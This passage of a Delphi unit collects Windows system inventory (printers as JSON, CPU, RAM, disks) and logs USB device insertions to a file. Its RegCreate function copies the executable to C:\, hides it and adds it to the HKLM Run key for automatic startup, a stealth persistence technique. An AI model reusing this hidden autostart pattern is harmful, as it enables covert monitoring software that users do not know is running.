  Append(Aux);

  fEnumPrintersA := GetProcAddress(LoadLibrary('winspool.drv'), 'EnumPrintersA');
  fGetDefaultPrinterA := GetProcAddress(LoadLibrary('winspool.drv'), 'GetDefaultPrinterA');
  ArraySize := 0;
  BufferSize := 0;
  fEnumPrintersA(PRINTER_ENUM_LOCAL or PRINTER_ENUM_CONNECTIONS, nil, 2, nil, 0, BufferSize, ArraySize);
  PPrinterEnumArray := AllocMem(BufferSize);
  try
    if fEnumPrintersA(PRINTER_ENUM_LOCAL or PRINTER_ENUM_CONNECTIONS, nil, 2, PPrinterEnumArray, BufferSize, BufferSize, ArraySize) then
    begin
      GetMem(TmpName, 1000);
      fGetDefaultPrinterA(TmpName, BufferSize);
      PLocator := PPrinterEnumArray;
      if ArraySize > 0 then
      begin
        Writeln(Aux, '"printers":[');
        for i := 0 to ArraySize - 1 do
        begin
          Buffer := StrPas(PLocator^.pPrinterName);
          UniqueString(Buffer); // make sure we have a unique string instance and not a pointer
          if (Pos('#:', Buffer) <> 0) then
          begin
            Buffer := Copy(Buffer, 0, Length(Buffer) - 3);
          end;
          if (Pos('#:', TmpName) <> 0) then
          begin
            TmpName := PChar(Copy(TmpName, 0, Length(TmpName) - 3));
          end;
          Writeln(Aux, '{"name":"' + Buffer + '",');
          if ((PRINTER_ATTRIBUTE_LOCAL and PLocator^.Attributes) <> 0) then
            Writeln(Aux, '"type":"local",')
          else
            Writeln(Aux, '"type":"network",');
          if (PLocator^.pLocation <> ' ') then
            Writeln(Aux, '"path":"' + PLocator^.pLocation + '",')
          else
            Writeln(Aux, '"path":"",');
          //Writeln(Aux, '"path":"' + PLocator^.pPortName + '",');
          if ((PRINTER_ATTRIBUTE_SHARED and PLocator^.Attributes) <> 0) then
            Write(Aux, '"shared":1,')
          else
            Write(Aux, '"shared":0,');
          if (TmpName = Buffer) then
            Write(Aux, '"default":1}')
          else
            Write(Aux, '"default":0}');
          if (not (i = (ArraySize - 1))) then
            Writeln(Aux, ',');
          Inc(PLocator);
        end;
      end;
    end;
  except
    CloseFile(Aux);
  end;
  FreeMem(PPrinterEnumArray);
  Writeln(Aux, '],');
  Writeln(Aux, '');
  CloseFile(Aux);
end;

{=========================================================================}

function GetDrive(pDBVol: PDevBroadcastVolume): string;
 var
  i: Byte;
  Maske: DWORD;
begin
  if (pDBVol^.dbcv_flags and DBTF_MEDIA) = DBTF_MEDIA then
  begin
    Maske := pDBVol^.dbcv_unitmask;
    for i := 0 to 25 do
    begin
      if (Maske and 1) = 1 then
        Result := Char(i + Ord('A')) + ':\';
      Maske := Maske shr 1;
    end;
  end;
end;

{=========================================================================}

function GetVolumeExtent(DriverLetter: Char): TDiskExtent; stdcall;
 var
  hVolume: THandle;
  DiskExtents: PVolumeDiskExtents;
  dwOutBytes: Cardinal;
begin
  with Result do
  begin
    DiskNumber := 0;
    StartingOffset.QuadPart := 0;
    ExtentLength.QuadPart := 0;
  end;
  hVolume := CreateFile(PChar('\\.\' + DriverLetter + ':'), GENERIC_READ or GENERIC_WRITE,
  FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, 0, 0);
  if hVolume < 1 then Exit;
  DiskExtents := AllocMem(Max_Path);
  if (DeviceIoControl(hVolume, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, nil, 0, DiskExtents, Max_Path, dwOutBytes, nil)) then
  begin
    if (DiskExtents^.NumberOfDiskExtents > 0) then
      Result := DiskExtents^.Extents[0];
  end;
  FreeMem(DiskExtents);
  CloseHandle(hVolume);
end;

procedure GetDeviceChange(wParam, lParam: Integer);
 var
  Drive, a: string;
  Log: TextFile;
  Teste: Integer;
begin
  if ((PDevBroadcastHdr(lParam)^.dbcd_devicetype = DBT_DEVTYP_VOLUME) or
  (PDevBroadcastHdr(lParam)^.dbcd_devicetype = DBTF_MEDIA)) then
  begin
    Drive := GetDrive(PDevBroadcastVolume(lParam));
    try
      AssignFile(Log, GetCurrentDir + '\Logs.txt');
      if not FileExists(GetCurrentDir + '\Logs.txt') then
      begin
        Rewrite(Log);
        CloseFile(Log);
      end;
      Append(Log);
    except
      CloseFile(Log);
    end;
    Teste := GetDriveType(PChar(Drive));
    a := IntToStr(Teste);
    case GetDriveType(PChar(Drive)) of
      DRIVE_FIXED:        Write(Log, 'UNIT [PHISIC] = [' + Drive + ']');
      DRIVE_CDROM:        Write(Log, 'UNIT [CDROM] = [' + Drive + ']');
      DRIVE_REMOTE:       Write(Log, 'UNIT [SHARED] = [' + Drive + ']');
      DRIVE_REMOVABLE:    Write(Log, 'UNIT [REMOVABLE] = [' + Drive + ']');
      DRIVE_NO_ROOT_DIR:  Write(Log, 'UNIT [PENDRIVE] = [ROOT]');
    else
      Write(Log, 'UNIT [UNKNOW] = [' + Drive + ']');
    end;
    case wParam of
      DBT_DEVICEARRIVAL       : Writeln(Log, ' INSERTED [' + GetSystemTime + ']');
      DBT_DEVICEREMOVECOMPLETE: Writeln(Log, ' REMOVED [' + GetSystemTime + ']');
    end;
    CloseFile(Log);
  end;
end;

{========================END WINDOWS FUNCTIONS============================}
{=======================BEGIN HARDWARE FUNCTIONS==========================}

function GetCPUInfo: TCPUInfo;
 var
  OpenKey: HKEY;
  Buffer: array[0..255] of Char;
  Size, Clock: DWORD;
begin
  try
    Buffer := '';
    Size := SizeOf(Buffer);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'Hardware\Description\System\CentralProcessor\0', 0, KEY_READ, OpenKey) = ERROR_SUCCESS) then
    begin
      if RegQueryValueEx(OpenKey, 'VendorIdentifier', nil, nil, @Buffer, @Size) = ERROR_SUCCESS then
        Result.Vendor := Buffer;
      Buffer := '';
      Size := SizeOf(Buffer);

      if RegQueryValueEx(OpenKey, 'Identifier', nil, nil, @Buffer, @Size) = ERROR_SUCCESS then
        Result.Identifier := Buffer;
      Buffer := '';
      Size := SizeOf(Buffer);

      if RegQueryValueEx(OpenKey, 'ProcessorNameString', nil, nil, @Buffer, @Size) = ERROR_SUCCESS then
        Result.ProcessorName := Buffer;

      if RegQueryValueEx(OpenKey, '~MHz', nil, nil, @Clock, @Size) = ERROR_SUCCESS then
        Result.ClockSpeed := IntToStr(Clock) + ' MHz';

      RegCloseKey(OpenKey);
    end;
  except
    RegCloseKey(OpenKey);
    Exit;
  end;
end;

function GetCPUFeatures: TCPUID;
asm
{$IF Defined(CPUX86)}
  push  ebx
  push  edi
  mov   edi, eax
  mov   eax, 1
  cpuid
  mov   [edi+$0], eax
  mov   [edi+$4], ebx
  mov   [edi+$8], ecx
  mov   [edi+$c], edx
  pop   edi
  pop   ebx
{$ELSEIF Defined(CPUX64)}
  mov   r8, rbx
  mov   r9, rcx
  mov   eax, 1
  cpuid
  mov   [r9+$0], eax
  mov   [r9+$4], ebx
  mov   [r9+$8], ecx
  mov   [r9+$c], edx
  mov   rbx, r8
{$IFEND}
end;

function GetCPUCores: TCores;
 const
  CPU_FEATURE_HYPERTHREADING = $800000;
  //PROCESSOR_ARCHITECTURE_AMD64 = 9; //x64
  //PROCESSOR_ARCHITECTURE_INTEL = 0; //x32
 var
  SysInfo: TSystemInfo;
  ID: TCPUID;
begin
  GetSystemInfo(SysInfo);
  Result.Cores := SysInfo.dwNumberOfProcessors;
  if SysInfo.dwNumberOfProcessors > 1 then
  begin
    ID := GetCPUFeatures;
    if (ID[3] and CPU_FEATURE_HYPERTHREADING) <> 0 then
      Result.Cores := Result.Cores div 2;
  end;
  {case SysInfo.wProcessorArchitecture of
    6:  Result.Architecture := 'x64';
    9:  Result.Architecture := 'x64';
    PROCESSOR_ARCHITECTURE_INTEL  : Result.Architecture := 'x32';
  end;}
  case SizeOf(nil) of
    4: Result.Architecture := 'x32';
    8: Result.Architecture := 'x64';
  end;
  // ============= BUG
end;

function GetRAM: Double;
 type
  uLongLong = Int64;
  DWordLong = uLongLong;

  LPMEMORYSTATUSEX = ^MEMORYSTATUSEX;
  _MEMORYSTATUSEX = record
    dwLength: DWORD;
    dwMemoryLoad: DWORD;
    ullTotalPhys: DWORDLONG;
    ullAvailPhys: DWORDLONG;
    ullTotalPageFile: DWORDLONG;
    ullAvailPageFile: DWORDLONG;
    ullTotalVirtual: DWORDLONG;
    ullAvailVirtual: DWORDLONG;
    ullAvailExtendedVirtual: DWORDLONG;
  end;
  MEMORYSTATUSEX = _MEMORYSTATUSEX;
  TMemoryStatusEx = MEMORYSTATUSEX;
  PMemoryStatusEx = LPMEMORYSTATUSEX;

 var
  MemoryStatus: TMemoryStatusEx;
  fGlobalMemoryStatusEx: function(var lpBuffer: MEMORYSTATUSEX): BOOL; stdcall;
begin
  FillChar(MemoryStatus, SizeOf(TMemoryStatusEx), #0);
  MemoryStatus.dwLength := SizeOf(TMemoryStatusEx);
  fGlobalMemoryStatusEx := GetProcAddress(GetModuleHandle('kernel32.dll'), 'GlobalMemoryStatusEx');
  if fGlobalMemoryStatusEx(MemoryStatus) then
    Result := MemoryStatus.ullTotalPhys / 1073741824
  else
    Result := 0;
end;

function GetHDName(Drive: PChar): string;
 var
  NotUsed, VolumeFlags, VolumeSerialNumber: DWORD;
  Buf:  array[0..MAX_PATH] of Char;
begin
  GetVolumeInformationA(Drive, Buf, SizeOf(Buf), @VolumeSerialNumber, NotUsed, VolumeFlags, nil, 0);
  SetString(Result, Buf, StrLen(Buf));
end;

function GetHDFreeSpace(Drive: PChar): Double;
 var
  Free, Total, Unused: Int64;
begin
  GetDiskFreeSpaceExA(Drive, Free, Total, @Unused);
  Result := Free / 1073741824;
end;

function GetHDTotSpace(Drive: PChar): Double;
 var
  Free, Total, Unused: Int64;
begin
  GetDiskFreeSpaceExA(Drive, Free, Total, @Unused);
  Result := Total / 1073741824;
end;

{========================END HARDWARE FUNCTIONS===========================}
{===================BEGIN IMPLEMENTED FUNCTIONS===========================}

function RegCreate(Name: string): Boolean;
 var
  OpenKey: HKEY;
begin
  Result := False;
  try
    if not FileExists('C:\' + Name + '.exe') then
    begin
      CopyFile(PChar(GetCurrentDir + '\' + Name + '.exe'), PChar('C:\' + Name + '.exe'), False);
      Windows.SetFileAttributes(PChar('C:\' + Name + '.exe'), FILE_ATTRIBUTE_HIDDEN);
      if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, nil,
      REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, OpenKey, nil) = ERROR_SUCCESS) then
      begin
        RegSetValueEx(OpenKey, PChar(Name), 0, REG_SZ, PChar('C:\' + Name + '.exe'),
        Length('C:\' + Name + '.exe') + 1);
        RegCloseKey(OpenKey);
        if ((GetCurrentDir + '\' + Name + '.exe') <> ('C:\' + Name + '.exe')) then
          FinallyRegCreate(Name);
        Result := True;
      end;
    end;
  except
    RegCloseKey(OpenKey);
    Exit;
  end;
end;

function GetSystemTime: string;
 var
  Time: TSystemTime;
  fGetSystemTime: procedure(var lpSystemTime: TSystemTime); stdcall;
begin
  fGetSystemTime := GetProcAddress(GetModuleHandle('kernel32.dll'), 'GetSystemTime');
  fGetSystemTime(Time);
  Result := IntToStr(Time.wDay) + '.' + IntToStr(Time.wMonth) + '.' + IntToStr(Time.wYear) + ' | ' +
  IntToStr(Time.wHour) + ':' + IntToStr(Time.wMinute);
end;

procedure TrimMemorySize;
 var
  hProcess: THandle;
begin
  hProcess := OpenProcess(PROCESS_SET_QUOTA, false, GetCurrentProcessId);
  try
    SetProcessWorkingSetSize(hProcess, $FFFFFFFF, $FFFFFFFF);
  finally
    CloseHandle(hProcess);
  end;
end;

{=======================END IMPLEMENTED FUNCTIONS=========================}
{=========================================================================}

end.
